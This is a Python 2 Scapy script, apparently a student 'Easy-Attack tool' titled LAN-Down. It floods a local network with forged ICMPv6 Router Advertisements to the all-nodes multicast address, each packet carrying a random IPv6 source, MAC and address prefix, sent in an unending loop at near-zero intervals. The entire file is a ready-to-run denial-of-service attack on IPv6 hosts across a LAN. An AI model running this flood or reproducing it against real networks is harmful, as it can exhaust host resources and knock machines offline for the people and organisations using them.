import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys
import random

#colossal
print """                                                                           
888             d8888 888b    888        8888888b.                                  
888            d88888 8888b   888        888  "Y88b                                 
888           d88P888 88888b  888        888    888                                 
888          d88P 888 888Y88b 888        888    888  .d88b.  888  888  888 88888b.  
888         d88P  888 888 Y88b888        888    888 d88""88b 888  888  888 888 "88b 
888        d88P   888 888  Y88888 888888 888    888 888  888 888  888  888 888  888 
888       d8888888888 888   Y8888        888  .d88P Y88..88P Y88b 888 d88P 888  888 
88888888 d88P     888 888    Y888        8888888P"   "Y88P"   "Y8888888P"  888  888                                                                                       
"""

a = 1

try:
    	print " Welcome to Easy-Attack tool: This tool is created for IIDT project. This is written in Python. This tool will send Packets with randowm IPv6, Mac and IP Prefix."
    	interface = raw_input("Select the interface (usually eth0 or wlan0) you want to use: ")
	print "Now sending packets to all nodes in the LAN."

	while a > 0:
	    mac = "00:18:" + ":".join(("%02x" % random.randint(0, 255) for i in range(4)))
	    ipv6 = "fe80::218:" + ":".join(("%x" % random.randint(0, 16**4) for i in range(3)))
	    prefix1 = "2a01:" + ":".join(("%x" % random.randint(0, 16**4) for i in range(3))) + "::"

	    try:
		packet = IPv6(src = ipv6, dst = "ff02::1")/ICMPv6ND_RA(chlim = 255, routerlifetime = 65535, reachabletime= 16384000,retranstimer= 1966080)/ICMPv6NDOptMTU(mtu = 1500)/ICMPv6NDOptPrefixInfo(prefixlen = 64, L=1, A=1, R=1, res1=0,prefix = prefix1 )/ICMPv6NDOptSrcLLAddr(lladdr = mac)

	    except socket.error:
		pass

	    send(packet, inter = 0.0000000001, verbose = 0, iface = interface)

	    print "*",
	    a = a+1
except KeyboardInterrupt:
    print "Process Interrupted by user"

print "Total %d packets sent" %a

